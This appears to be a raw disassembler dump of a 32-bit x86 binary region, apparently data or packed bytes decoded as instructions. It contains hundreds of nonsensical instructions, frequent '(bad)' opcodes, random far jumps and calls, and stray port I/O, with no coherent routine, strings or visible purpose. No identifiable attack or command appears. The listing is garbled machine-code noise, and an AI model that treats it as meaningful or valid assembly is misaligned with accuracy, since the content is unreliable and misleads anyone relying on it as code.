  4230b3:	lds    ebp,FWORD PTR [eax-0x4238f767]
  4230b9:	dec    esi
  4230ba:	mov    al,0xee
  4230bc:	add    edx,DWORD PTR [eax]
  4230be:	outs   dx,BYTE PTR ds:[esi]
  4230bf:	leave  
  4230c0:	mov    ds:0x74ea1fd,al
  4230c5:	sbb    DWORD PTR [ecx],ebx
  4230c7:	(bad)  
  4230c8:	cdq    
  4230c9:	call   0x384f:0x395d0fc8
  4230d0:	inc    esi
  4230d1:	mov    ds:0x75ddcf4a,al
  4230d6:	jp     0x4230bf
  4230d8:	mov    eax,0x5fa6cff4
  4230dd:	(bad)  
  4230de:	daa    
  4230df:	dec    edi
  4230e0:	(bad)  
  4230e2:	add    al,0x73
  4230e4:	shl    DWORD PTR [bx+0x2f],cl
  4230e8:	aas    
  4230e9:	jmp    0xd5cc:0x1417de18
  4230f0:	enter  0x9a55,0x8a
  4230f4:	pop    ss
  4230f5:	in     eax,dx
  4230f6:	xor    bl,ch
  4230f8:	(bad)  
  4230f9:	xor    DWORD PTR [esi],esp
  4230fb:	mov    dh,0x23
  4230fd:	loope  0x423118
  4230ff:	repnz (bad) 
  423101:	aaa    
  423102:	jb     0x4230b3
  423104:	fwait
  423105:	bound  edx,QWORD PTR [edx]
  423107:	or     edx,esp
  423109:	(bad)  
  42310b:	or     ebx,DWORD PTR [edi+0x1118481b]
  423111:	jbe    0x4230c5
  423113:	fcomp  QWORD PTR [esi+0x58]
  423116:	add    DWORD PTR [eax+0x6d1434c9],eax
  42311c:	xchg   edx,eax
  42311d:	jns    0x4230ee
  42311f:	test   BYTE PTR [edx+0x76f7a416],al
  423125:	mov    esi,0x3a2a0e24
  42312a:	add    BYTE PTR [edx+0x5a58ddf5],al
  423130:	xchg   DWORD PTR [ebx+ebp*8-0x69],esp
  423134:	jbe    0x423181
  423136:	das    
  423137:	(bad)  
  423139:	lods   al,BYTE PTR ds:[esi]
  42313a:	imul   ebp,eax,0xffffffa0
  42313d:	aas    
  42313e:	push   ecx
  42313f:	outs   dx,BYTE PTR ds:[esi]
  423140:	mov    ds:0x7c8214cf,eax
  423145:	jg     0x42315b
  423147:	loop   0x423187
  423149:	jmp    0x69eb980f
  42314e:	popa   
  42314f:	push   ds
  423150:	pusha  
  423151:	and    eax,0x5feb2e74
  423156:	out    dx,al
  423157:	push   ecx
  423158:	add    eax,0xc45067b0
  42315d:	jecxz  0x42311b
  42315f:	xchg   edi,eax
  423160:	mov    WORD PTR [edx],ss
  423162:	xchg   edi,eax
  423163:	aad    0x97
  423165:	pop    esi
  423166:	in     al,dx
  423167:	shl    BYTE PTR ds:0xaca550a5,cl
  42316d:	fsubrp st(0),st
  42316f:	iret   
  423170:	shr    BYTE PTR [edi+eax*8+0x35],0x72
  423175:	mov    esp,0xe92aca93
  42317a:	cmc    
  42317b:	inc    edi
  42317c:	push   cs
  42317d:	push   ds
  42317e:	shl    DWORD PTR [eax+0x443a116a],1
  423184:	jne    0x4231ee
  423186:	(bad)  [esi+0x15]
  423189:	mov    DWORD PTR [ebx+0x452c4fd5],0xfb5
	...
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x28e1d42c],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0x2a000001,al
  42320d:	jo     0x423239
  42320f:	icebp  
  423210:	xchg   ebp,eax
  423211:	adc    esi,DWORD PTR [ecx]
  423213:	cwde   
  423214:	sbb    al,0x77
  423216:	fs fcmovbe st,st(0)
  423219:	out    0x49,eax
  42321b:	inc    esi
  42321c:	sahf   
  42321d:	dec    ecx
  42321e:	cmp    eax,0x86269d15
  423223:	lock js 0x4231bb
  423226:	nop
  423227:	sub    eax,0xf4b6eb59
  42322c:	xor    eax,0xcad58696
  423231:	gs pop eax
  423233:	fidivr DWORD PTR [ebp+0x34d734f7]
  423239:	inc    eax
  42323a:	jmp    0x3fba:0x43004efc
  423241:	mov    esp,0x941d58bb
  423246:	push   edi
  423247:	rol    BYTE PTR [ebp-0x5c],cl
  42324a:	out    0x13,al
  42324c:	(bad)  
  42324d:	jg     0x4232bf
  42324f:	mov    bl,0x79
  423251:	dec    esi
  423253:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423254:	es push es
  423256:	mov    esp,0x4826a593
  42325b:	pop    ds
  42325c:	push   eax
  42325d:	retf   0xf25
  423260:	sar    DWORD PTR [edx-0x11e4cab0],0xee
  423267:	sub    bh,BYTE PTR [ecx-0x67f67cc]
  42326d:	push   0xffffffc0
  42326f:	xchg   edi,eax
  423270:	pop    esi
  423271:	sahf   
  423272:	mov    ds:0xc4cbf637,al
  423277:	ror    DWORD PTR [eax-0x6c2f89d],1
  42327d:	leave  
  42327e:	stc    
  42327f:	sbb    eax,0xa6e71e3c
  423284:	jbe    0x423255
  423286:	push   edx
  423287:	int    0xc4
  423289:	js     0x42323e
  42328b:	jno    0x423224
  42328d:	jo     0x4232a7
  42328f:	and    al,BYTE PTR ds:0x3938cc3f
  423295:	repz (bad) 
  423297:	out    dx,eax
  423298:	inc    BYTE PTR [ecx+0x7]
  42329b:	test   eax,0x1d129a73
  4232a0:	ror    DWORD PTR [edi],1
  4232a2:	adc    DWORD PTR [esi-0x51],esi
  4232a5:	and    eax,0x69852c20
  4232aa:	data16 fld QWORD PTR [edx+edi*8]
  4232ae:	mov    esp,0xc9ce8ba7
  4232b3:	(bad)
  4232b6:	and    DWORD PTR [ecx-0x620c8a3],0x5c6df995
  4232c0:	push   cs
  4232c1:	inc    esp
  4232c2:	(bad)  
  4232c3:	scas   eax,DWORD PTR es:[edi]
  4232c4:	aad    0xa5
  4232c6:	dec    esi
  4232c7:	pop    ds
  4232c8:	sbb    eax,0xd968b687
  4232cd:	sahf   
  4232ce:	mov    WORD PTR [edi-0x5f],gs
  4232d1:	je     0x4232d9
  4232d3:	fcomi  st,st(1)
  4232d5:	out    0xb2,eax
  4232d7:	pop    ss
  4232d8:	aas    
  4232d9:	rol    BYTE PTR [ebx],cl
  4232db:	sbb    eax,0xbbbd54b7
  4232e0:	in     eax,dx
  4232e1:	lock pop esp
  4232e3:	ins    BYTE PTR es:[edi],dx
  4232e4:	jb     0x4232ee
  4232e6:	leave  
  4232e7:	push   cs
  4232e8:	adc    ecx,DWORD PTR [edx]
  4232ea:	shl    BYTE PTR [eax-0x234d9842],0x29
  4232f1:	mov    ch,0x17
  4232f3:	fcomp  QWORD PTR [eax]
  4232f5:	xchg   DWORD PTR [ecx-0x45],eax
  4232f8:	inc    ebp
  4232f9:	enter  0xbfb7,0x41
  4232fd:	mov    ebx,0x888a696f
  423302:	push   edx
  423303:	inc    ebx
  423304:	nop
  423305:	inc    edx
  423306:	retf   
  423307:	ja     0x42328a
  423309:	(bad)  
  42330a:	pmaxub mm3,QWORD PTR [ebx-0x5c49ab84]
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x8a830f44
  423382:	scas   al,BYTE PTR es:[edi]
  423383:	mov    ebx,0x1780b
  423388:	add    eax,0x5f000001
  42338d:	sti    
  42338e:	retf   0x73d
  423391:	call   0x50791a0b
  423396:	sbb    BYTE PTR [eax+0x59],0x53
  42339a:	adc    al,cl
  42339c:	sub    al,0x89
  42339e:	sbb    dh,BYTE PTR [edx+0x4f]
  4233a1:	adc    ch,BYTE PTR [edi+0x6d6dacd4]
  4233a7:	pop    ebx
  4233a8:	pop    esi
  4233a9:	(bad)  
  4233aa:	ror    DWORD PTR [esi],1
  4233ac:	pop    ecx
  4233ad:	mov    eax,0x4f23df5d
  4233b2:	dec    edi
  4233b3:	test   DWORD PTR [edi+0xbb21c21],ebp
  4233b9:	xchg   esp,eax
  4233ba:	lods   eax,DWORD PTR ds:[esi]
  4233bb:	sub    ebp,0x4a
  4233be:	retf   0xada4
  4233c1:	pusha  
  4233c2:	rcl    DWORD PTR [ecx+ebx*8],cl
  4233c5:	push   cs
  4233c6:	mov    dl,0xae
  4233c8:	or     DWORD PTR [ebp+eiz*4-0x5766b675],ebp
  4233cf:	mov    ah,0x57
  4233d1:	into   
  4233d2:	fisubr WORD PTR [eax]
  4233d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4233d5:	aam    0xde
  4233d7:	stos   BYTE PTR es:[edi],al
  4233d8:	(bad)  
  4233d9:	xchg   esi,eax
  4233da:	mov    BYTE PTR ds:0xfa67e693,ch
  4233e0:	aad    0x7e
  4233e2:	arpl   WORD PTR [eax-0x22],sp
  4233e5:	call   0xf00b:0x4cad3af0
  4233ec:	mov    eax,ds:0x6f1b57e5
  4233f1:	js     0x42341f
  4233f3:	ss jge 0x423457
  4233f6:	xchg   ebx,eax
  4233f7:	dec    edx
  4233f8:	push   eax
  4233f9:	xchg   edx,eax
  4233fa:	pop    ebp
  4233fb:	adc    al,0x76
  4233fd:	pop    es
  4233fe:	addr16 pushaw 
  423401:	call   0xfaec:0x8cbd5749
  423408:	pusha  
  423409:	nop
  42340a:	test   bh,al
  42340c:	cmp    edx,DWORD PTR [ebp+ebx*4-0x2a]
  423410:	push   esi
  423411:	xchg   edx,eax
  423412:	ficomp DWORD PTR [ebp+ebx*2+0x53]
  423416:	(bad)  
  423417:	(bad)  
  423418:	pop    ss
  423419:	cli    
  42341a:	es pop ebp
  42341c:	xlat   BYTE PTR ds:[ebx]
  42341d:	push   0x8ba6e0f
  423422:	fadd   QWORD PTR [edi-0x56]
  423425:	cdq    
  423426:	aaa    
  423427:	pusha  
  423428:	lock push edx
  42342a:	or     al,0x76
  42342c:	xchg   BYTE PTR [ecx+0x68],dl
  42342f:	pop    ds
  423430:	xlat   BYTE PTR ds:[ebx]
  423431:	mov    bh,0xc9
  423433:	div    BYTE PTR [ebx]
  423435:	loopne 0x4233d7
  423437:	xchg   ch,bl
  423439:	fs into 
  42343b:	jne    0x42341e
  42343d:	hlt    
  42343e:	dec    esp
  42343f:	repnz sub edx,DWORD PTR es:[bp-0x76]
  423445:	in     al,dx
  423446:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423447:	mov    edx,0x2bafd7
  42344c:	out    0x70,al
  42344e:	lods   al,BYTE PTR ds:[esi]
  42344f:	xor    DWORD PTR [ebp-0x65fdeee0],esp
  423455:	and    al,0x92
  423457:	push   esi
  423458:	addr16 push ecx
  42345a:	jne    0x423485
  42345c:	je     0x42346c
  42345e:	iret   
  42345f:	mov    cl,0x1d
  423461:	sub    DWORD PTR [edx],0x80734edf
  423467:	(bad)  
  423468:	xor    ecx,edi
  42346a:	imul   edx,DWORD PTR [ebx],0x3abaccac
  423470:	push   eax
  423471:	mov    ds:0xa7a4ffa6,eax
  423476:	and    esi,edx
  423478:	adc    eax,0x27f5e827
  42347d:	xchg   edx,eax
  42347e:	xor    al,0x50
  423480:	test   al,0x76
  423482:	sbb    edx,esi
  423484:	jmp    0xcc5f:0xb4fd538a
  42348b:	fdiv   QWORD PTR [edi-0x21]
  42348e:	icebp  
  42348f:	fldenv [esi]
	...
  4234f1:	add    BYTE PTR [eax],al
  4234f3:	add    al,al
  4234f5:	mov    al,0x45
  4234f7:	outs   dx,DWORD PTR ds:[esi]
  4234f8:	jne    0x4234f9
  4234fa:	jmp    0x9f1f:0xadf467bf
  423501:	loop   0x4234d4
  423503:	xor    dl,BYTE PTR [eax]
  423505:	jns    0x423508
  423507:	add    BYTE PTR ds:0x88000001,al
  42350d:	jmp    0xe9a7:0x74ba241c
  423514:	jb     0x423536
  423516:	in     eax,0x1d
  423518:	sbb    eax,0x1fbab07f
  42351d:	mov    eax,ds:0x1007b5a
  423522:	xchg   BYTE PTR [edx-0x5805f358],al
  423528:	xchg   esi,eax
  423529:	push   eax
  42352a:	call   0xc508465e
  42352f:	ds pop eax
  423531:	and    ebp,DWORD PTR [edi-0x51949b43]
  423537:	(bad)  
  423538:	(bad)  
  423539:	fs ins DWORD PTR es:[edi],dx
  42353b:	adc    bl,BYTE PTR [ebp-0x37]
  42353e:	scas   al,BYTE PTR es:[edi]
  42353f:	fbld   TBYTE PTR ds:0x16077319
  423545:	lods   al,BYTE PTR ds:[esi]
  423546:	out    dx,eax
  423547:	push   0xfffffff4
  423549:	lods   eax,DWORD PTR ds:[esi]
  42354a:	sub    esi,eax
  42354c:	lods   al,BYTE PTR ds:[esi]
  42354d:	push   esp
  42354e:	mov    ebp,0xa2fcd609
  423553:	int3   
  423554:	cs repnz lahf 
  423557:	adc    BYTE PTR [ebp-0x69228f89],dl
  42355d:	clc    
  42355e:	pop    ebp
  42355f:	mov    ah,0x5a
  423561:	lahf   
  423562:	xchg   esp,eax
  423563:	xchg   esp,eax
  423564:	mov    dl,0xe
  423566:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423567:	dec    ecx
  423568:	mov    es:0x126429e6,eax
  42356e:	and    al,0x44
  423570:	adc    BYTE PTR [ebx],cl
  423572:	xor    al,0x17
  423574:	xchg   ecx,eax
  423575:	sub    eax,0xa3bdb8cb
  42357a:	cdq    
  42357b:	jl     0x423577
  42357d:	std    
  42357e:	cwde   
  42357f:	jle    0x42352c
  423581:	in     eax,dx
  423582:	add    DWORD PTR [ebx],0x2bb1cbe7
  423588:	cmp    BYTE PTR [edi-0xa837d28],dl
  42358e:	mov    ch,0xf3
  423590:	cmp    ebp,DWORD PTR [esi-0x59df4254]
  423596:	xor    DWORD PTR [ecx],0xffffffc4
  423599:	xchg   DWORD PTR ds:0x1d6d3c84,esp
  42359f:	ja     0x423593
  4235a1:	dec    edx
  4235a2:	xor    BYTE PTR [eax+0x23f29c4b],al
  4235a8:	jge    0x42360f
  4235aa:	mov    eax,0x3f43f056
  4235af:	in     al,0x2b
  4235b1:	rcr    ebp,cl
  4235b3:	addr16 daa 
  4235b5:	or     ebx,DWORD PTR [ecx-0x75]
  4235b8:	dec    esp
  4235b9:	test   BYTE PTR [edx+0x3e72dfb5],dl
  4235bf:	jl     0x42357c
  4235c1:	cld    
  4235c2:	adc    eax,0xd4eb9852
  4235c7:	rcl    BYTE PTR [ebp+0x36],1
  4235ca:	scas   al,BYTE PTR es:[edi]
  4235cb:	push   0x80140a8d
  4235d0:	and    DWORD PTR [ecx],0xfc845299
  4235d6:	push   es
  4235d7:	stc    
  4235d8:	ja     0x4235d1
  4235da:	test   BYTE PTR [ecx+0x4999860a],0xff
  4235e1:	inc    esp
  4235e2:	or     ah,BYTE PTR [edi]
  4235e4:	jnp    0x423572
  4235e6:	cwde   
  4235e7:	out    dx,al
  4235e8:	xchg   DWORD PTR [edx-0x6fc1fe09],esp
  4235ee:	jg     0x42358a
  4235f0:	in     al,dx
  4235f1:	xor    cl,BYTE PTR [edx+edx*8+0x74a38afd]
  4235f8:	sbb    DWORD PTR [eax],esi
  4235fa:	shl    BYTE PTR [edx],1
  4235fc:	xor    eax,0xb986537b
  423601:	push   ebx
  423602:	data16 jmp 0x4235cb
  423605:	nop
  423606:	retf   
  423607:	xor    al,0x13
  423609:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42360a:	mov    cl,0xca
  42360c:	scas   al,BYTE PTR es:[edi]
  42360d:	fs loop 0x4235b4
  423610:	jmp    0x423612
	...
  423672:	add    BYTE PTR [eax],al
  423674:	or     BYTE PTR [edi-0x8808b84],0x88
  42367b:	jmp    FWORD PTR [esi-0x6f]
  42367e:	jl     0x423693
  423680:	int3   
  423681:	outs   dx,WORD PTR ds:[esi]
  423683:	aad    0x15
  423685:	jp     0x423688
  423687:	add    BYTE PTR ds:0x8e000001,al
  42368d:	sbb    dh,BYTE PTR [edx-0x63d726d8]
  423693:	je     0x423641
  423695:	into   
  423696:	mov    esi,0xada37fae
  42369b:	out    dx,eax
  42369c:	fadd   DWORD PTR [eax]
  42369e:	das    
  42369f:	or     DWORD PTR [eax],ebx
  4236a1:	out    0xfe,eax
  4236a3:	xchg   ecx,eax
  4236a4:	(bad)  
  4236a5:	and    ecx,edx
  4236a7:	(bad)  
  4236a8:	int3   
  4236a9:	rcr    BYTE PTR [esi-0x18],cl
  4236ac:	add    eax,0xc5b76c2c
  4236b1:	out    0xc5,eax
  4236b3:	jo     0x423638
  4236b5:	mov    edi,0xb1b5d580
  4236ba:	scas   al,BYTE PTR es:[edi]
  4236bb:	or     dl,BYTE PTR [ecx-0x3875087a]
  4236c1:	mov    al,0x85
  4236c3:	test   DWORD PTR [edx],0x7403c857
  4236c9:	idiv   dh
  4236cb:	lea    eax,[ebx+edi*4]
  4236ce:	pusha  
  4236cf:	mov    ebp,0x9cc3e585
  4236d4:	call   0x8d979f41
  4236d9:	jmp    0x42371a
  4236db:	mov    DWORD PTR es:[ebx-0x44],esp
  4236df:	jmp    0x53dd:0xeea654cf
  4236e6:	pusha  
  4236e7:	popf   
  4236e8:	mov    al,ds:0xed8c58d2
  4236ed:	popa   
  4236ee:	cmp    eax,0x9e962a42
  4236f3:	xchg   edx,eax
  4236f4:	jnp    0x423762
  4236f6:	jnp    0x4236cc
  4236f8:	mov    ah,0xb4
  4236fa:	push   edi
  4236fb:	ss and al,0xb9
  4236fe:	mov    al,0xce
  423700:	lea    esp,[esp+ebx*1-0x7]
  423704:	or     edx,DWORD PTR [edx]
  423706:	mov    ebx,esp
  423708:	test   al,0x47
  42370a:	in     al,dx
  42370b:	add    ch,bh
  42370d:	loop   0x423699
  42370f:	jge    0x42376c
  423711:	add    DWORD PTR [ecx-0x692d925e],esi
  423717:	mov    ds:0x9ef038b8,eax
  42371c:	fwait
  42371d:	pop    edi
  42371e:	(bad)  
  42371f:	xchg   esi,eax
  423720:	call   0xbda0bd23
  423725:	mov    esi,0xc4e45000
  42372a:	jmp    0x42377e
  42372c:	mov    DWORD PTR [eax+0x7c],ebp
  42372f:	inc    esp
  423730:	mov    ebx,0xac88b16a
  423735:	out    0x48,al
  423737:	mov    bh,0x47
  423739:	mov    esp,0xd836aea
  42373e:	jecxz  0x4236f0
  423740:	cmp    esp,edi
  423742:	xor    esi,edx
  423744:	jae    0x42370e
  423746:	mov    ds:0x1c473a43,al
  42374b:	mov    ebp,0x187aaf4e
  423750:	data16 sbb bl,bh
  423753:	das    
  423754:	and    cl,BYTE PTR [edi+0x699b632f]
  42375a:	hlt    
  42375b:	daa    
  42375c:	add    dh,BYTE PTR [edx+eiz*1+0x48]
  423760:	ja     0x4237c7
  423762:	dec    edx
  423763:	clc    
  423764:	mov    ds:0xc04a525f,al
  423769:	cwde   
  42376a:	test   DWORD PTR ds:0xf1e301a8,ecx
  423770:	inc    eax
  423771:	popf   
  423772:	cmp    esi,DWORD PTR [esi]
  423774:	cmp    BYTE PTR [ebp*1-0x320c389e],bh
  42377b:	push   edi
  42377c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42377d:	outs   dx,BYTE PTR ds:[esi]
  42377e:	loopne 0x4237ad
  423780:	mov    dl,BYTE PTR [edi-0x6b024699]
  423786:	repz test BYTE PTR [ebp+0x57],0xf
  42378b:	into   
  42378c:	addr16 in al,0x55
  42378f:	add    bl,BYTE PTR [ebx]
	...
  4237f1:	add    BYTE PTR [eax],al
  4237f3:	add    BYTE PTR [ebx+eiz*1],dh
  4237f6:	jo     0x423795
  4237f8:	ja     0x4237d9
  4237fa:	std    
  4237fb:	stos   DWORD PTR es:[edi],eax
  4237fc:	(bad)  
  4237fd:	sbb    edx,esi
  4237ff:	jmp    0x7b1a:0x913542a8
  423806:	add    DWORD PTR [eax],eax
  423808:	add    eax,0x14000001
  42380d:	ret    0x6633
  423810:	lock rol edi,1
  423813:	sub    eax,0x50758d0d
  423818:	jg     0x42386d
  42381a:	mov    al,0x77
  42381c:	ror    BYTE PTR [ebp+0x2e],cl
  42381f:	push   ebx
  423820:	call   0x3c5b:0xe0af4d5d
  423827:	sbb    eax,0xb889531d
  42382c:	imul   DWORD PTR [esi+esi*8-0x3c382545]
  423833:	xchg   ecx,eax
  423834:	mov    dl,0x8f
  423836:	cmp    al,0x6d
  423838:	mov    edx,DWORD PTR [eax-0x45e1c399]
  42383e:	out    0xe9,al
  423840:	jl     0x42386e
  423842:	(bad)  
  423844:	inc    esi
  423845:	dec    eax
  423846:	rcl    ebx,cl
  423848:	xchg   esi,edi
  42384a:	in     eax,dx
  42384b:	retf   0x12fe
  42384e:	adc    ah,al
  423850:	sub    DWORD PTR [edx-0x386adb97],esp
  423856:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423857:	mov    ds:0x71727068,al
  42385c:	pop    es
  42385d:	stos   DWORD PTR es:[edi],eax
  42385e:	repz out 0x6d,al
  423861:	sbb    BYTE PTR [eax+0x23],bh
  423864:	adc    cl,al
  423866:	mov    dl,cl
  423868:	inc    eax
  423869:	or     BYTE PTR [ecx+eax*8+0x5a0f01af],dl
  423870:	mov    al,ds:0xddd919ee
  423875:	cmp    eax,0x39e525e3
  42387a:	or     eax,DWORD PTR [ecx]
  42387c:	pusha  
  42387d:	pushw  0xffda
  423880:	cdq    
  423881:	je     0x423817
  423883:	inc    esi
  423884:	sub    eax,0x29fe3d01
  423889:	pop    ecx
  42388a:	repnz dec ebp
  42388c:	retf   0x4ce8
  42388f:	test   DWORD PTR [edx+0x570b8923],0x28b3ad7c
  423899:	push   esp
  42389a:	xor    BYTE PTR ds:0xf464d38c,al
  4238a0:	and    DWORD PTR [edx+0x3d],0xffffffa2
  4238a4:	je     0x423891
  4238a6:	mov    DWORD PTR [ebx+0x43d00976],ebp
  4238ac:	cmc    
  4238ad:	adc    DWORD PTR [edi],0xb0709b8d
  4238b3:	adc    BYTE PTR [edx-0x33],dl
  4238b6:	mov    ?,WORD PTR [ebx-0x54]
  4238b9:	cs jne 0x42383f
  4238bc:	push   0xffffffbb
  4238be:	stos   DWORD PTR es:[edi],eax
  4238bf:	cmp    BYTE PTR [ecx-0x2e],ah
  4238c2:	rol    DWORD PTR [edx],cl
  4238c4:	push   eax
  4238c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238c6:	loope  0x423855
  4238c8:	add    al,0xb7
  4238ca:	add    cl,BYTE PTR [edx-0x4c]
  4238cd:	shr    BYTE PTR [edx+eax*1],1
  4238d0:	into   
  4238d1:	jnp    0x423865
  4238d3:	jbe    0x423871
  4238d5:	stos   DWORD PTR es:[edi],eax
  4238d6:	sbb    BYTE PTR [ebp+0x479e95d],bh
  4238dc:	daa    
  4238dd:	push   esi
  4238de:	daa    
  4238df:	stos   DWORD PTR es:[edi],eax
  4238e0:	xchg   edi,eax
  4238e1:	add    ecx,ecx
  4238e3:	aam    0xe8
  4238e5:	xchg   edi,eax
  4238e6:	outs   dx,DWORD PTR ds:[esi]
  4238e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4238e8:	loopne 0x423911
  4238ea:	test   eax,0x3334e1ef
  4238ef:	or     al,0x2d
  4238f1:	adc    eax,0xb1fb3bcd
  4238f6:	xchg   edi,eax
  4238f7:	mov    cl,0x14
  4238f9:	xchg   edx,eax
  4238fa:	mov    ch,0xe0
  4238fc:	ja     0x4238dd
  4238fe:	xchg   ebp,eax
  4238ff:	into   
  423900:	cmp    DWORD PTR [edi+0x4c52fdbf],eax
  423906:	sub    dh,BYTE PTR [eax+0x537f6b4f]
  42390c:	pop    esi
  42390d:	mov    bh,0x33
  42390f:	sub    al,0x70
	...
  423971:	add    BYTE PTR [eax],al
  423973:	add    BYTE PTR [edx-0x770e5c],cl
  423979:	(bad)  
  42397b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42397c:	push   ecx
  42397d:	sbb    eax,0xed372bbd
  423982:	fisub  WORD PTR [eax+0x1f]
  423985:	jl     0x423988
  423987:	add    BYTE PTR ds:0x5e000001,al
  42398d:	dec    eax
  42398e:	retf   
  42398f:	adc    cl,BYTE PTR [ebp+0x46]
  423992:	int    0x8f
  423994:	or     cl,ch
  423996:	jecxz  0x42393f
  423998:	cmp    eax,0x2c8ac785
  42399d:	push   0x4b
  42399f:	inc    ebx
  4239a0:	enter  0x33e1,0xdb
  4239a4:	call   0xb0a6:0x562e5d91
  4239ab:	lods   al,BYTE PTR ds:[esi]
  4239ac:	in     eax,0x6a
  4239ae:	jmp    0xb746f434
  4239b3:	outs   dx,BYTE PTR ds:[esi]
  4239b4:	push   ebp
  4239b5:	pop    esi
  4239b6:	sub    eax,0xce1d334f
  4239bb:	int3   
  4239bc:	pop    ebp
  4239bd:	(bad)  
  4239be:	jbe    0x42396c
  4239c0:	repnz push ebx
  4239c2:	sbb    bh,dl
  4239c4:	xor    DWORD PTR [ebx+0x6f1fb82e],ecx
  4239ca:	jne    0x423a09
  4239cc:	xor    ebp,0x3354b042
  4239d2:	sub    dl,BYTE PTR [ecx]
  4239d4:	sub    BYTE PTR [ebx],0x7c
  4239d7:	mov    esi,0xd5209137
  4239dc:	les    ecx,FWORD PTR [edx+ebp*4+0x11ac760d]
  4239e3:	xor    DWORD PTR [ebx-0x5e],eax
  4239e6:	fyl2x  
  4239e8:	and    dh,BYTE PTR [edi+0x74]
  4239eb:	lods   eax,DWORD PTR ds:[esi]
  4239ec:	jle    0x423985
  4239ee:	jb     0x4239a1
  4239f0:	push   esp
  4239f1:	inc    edx
  4239f2:	and    eax,0xb3acba54
  4239f7:	jae    0x4239bf
  4239f9:	jae    0x423a17
  4239fb:	gs shr eax,cl
  4239fe:	mov    bh,0x57
  423a00:	int3   
  423a01:	xchg   ebx,eax
  423a02:	call   0xc04b:0x7f2b655a
  423a09:	idiv   DWORD PTR [esi+0x49]
  423a0c:	push   ds
  423a0d:	xlat   BYTE PTR ds:[ebx]
  423a0e:	dec    eax
  423a0f:	mov    al,ds:0x6fcb9eff
  423a14:	icebp  
  423a15:	fmul   DWORD PTR [esi]
  423a17:	pop    es
  423a18:	and    cl,BYTE PTR gs:[ebx]
  423a1b:	adc    al,0x89
  423a1d:	hlt    
  423a1e:	dec    esp
  423a1f:	xor    BYTE PTR [edx],0x41
  423a22:	not    DWORD PTR [ebp+0x50]
  423a25:	ins    BYTE PTR es:[edi],dx
  423a26:	mov    esi,0xea542f89
  423a2b:	mov    al,ds:0x24da959c
  423a30:	pop    eax
  423a31:	dec    edx
  423a32:	xor    ah,BYTE PTR [esi+0x2b21c00e]
  423a38:	sub    al,0x29
  423a3a:	mov    ebx,0x1dd2f12f
  423a3f:	test   eax,0xba4a0e31
  423a44:	les    eax,FWORD PTR [edi]
  423a46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a47:	xchg   DWORD PTR [ecx],ebx
  423a49:	jb     0x423a34
  423a4b:	int    0xb1
  423a4d:	call   0xc59f:0x9e6cd91b
  423a54:	or     dl,BYTE PTR [ecx+0x26582669]
  423a5a:	push   ss
  423a5b:	push   edx
  423a5c:	sub    ebp,ecx
  423a5e:	stc    
  423a5f:	fdiv   DWORD PTR [ecx+ebx*4+0x59ec15b0]
  423a66:	mov    dh,0xeb
  423a68:	inc    edx
  423a69:	or     DWORD PTR [ebp-0xc],esp
  423a6c:	pop    edx
  423a6d:	imul   ebx,DWORD PTR [esi],0x63c689ba
  423a73:	dec    ecx
  423a74:	(bad)  [edi-0x40]
  423a77:	rol    BYTE PTR [ecx-0x13],1
  423a7a:	sub    eax,0xb8f5abd8
  423a7f:	or     esp,eax
  423a81:	inc    eax
  423a82:	ja     0x423a70
  423a84:	xor    al,0x54
  423a86:	test   ecx,eax
  423a88:	inc    eax
  423a89:	mov    WORD PTR [ebx+0x8],ds
  423a8c:	mov    ecx,0xdb9d6e00
	...
  423af1:	add    BYTE PTR [eax],al
  423af3:	add    BYTE PTR [eax],dh
  423af5:	cmp    eax,0xdf7d9f75
  423afa:	cli    
  423afb:	mov    edi,0x60851ed8
  423b00:	mov    al,ds:0x24f2e9da
  423b05:	jge    0x423b08
  423b07:	add    BYTE PTR ds:0x1,al
  423b0d:	sbb    DWORD PTR [esi-0x1926328],0xe53fcf71
  423b17:	fstp   st(6)
  423b19:	inc    ebx
  423b1a:	push   eax
  423b1b:	xor    DWORD PTR [edx-0x31e08c2f],esp
  423b21:	jb     0x423afc
  423b23:	(bad)  
  423b24:	ja     0x423aab
  423b26:	shr    bl,0xc5
  423b29:	sbb    cl,ah
  423b2b:	daa    
  423b2c:	mov    ds:0xded49d81,eax
  423b31:	jecxz  0x423b88
  423b33:	sbb    DWORD PTR [eax+0x4e3f24da],eax
  423b39:	outs   dx,BYTE PTR ds:[esi]
  423b3a:	jle    0x423b00
  423b3c:	outs   dx,BYTE PTR ds:[esi]
  423b3d:	fcmove st,st(0)
  423b3f:	daa    
  423b40:	and    DWORD PTR [esi+0x7a703d14],ecx
  423b46:	and    al,0xe9
  423b48:	mov    ds:0xf2c27ef1,al
  423b4d:	into   
  423b4e:	fadd   DWORD PTR [edx-0x5ef0a2a2]
  423b54:	fnstsw WORD PTR cs:[ebx-0x5d]
  423b58:	jb     0x423ba7
  423b5a:	sub    al,0x69
  423b5c:	mov    ds:0x37ad68c4,al
  423b61:	pop    ds
  423b62:	jmp    0x2596de4
  423b67:	mov    cl,0x7c
  423b69:	push   0xffffff9c
  423b6b:	icebp  
  423b6c:	call   0x1c56:0x4e30e894
  423b73:	retf   0x8e32
  423b76:	xor    DWORD PTR [eax+0x4fccef6c],0xffffffef
  423b7d:	push   eax
  423b7e:	xchg   ecx,eax
  423b7f:	lds    edx,FWORD PTR [ebx+0x34db353d]
  423b85:	ja     0x423b57
  423b87:	rcl    BYTE PTR [eax+0x1],1
  423b8a:	jmp    0xd18936be
  423b8f:	cmc    
  423b90:	call   0x3ac2:0xdf8342fb
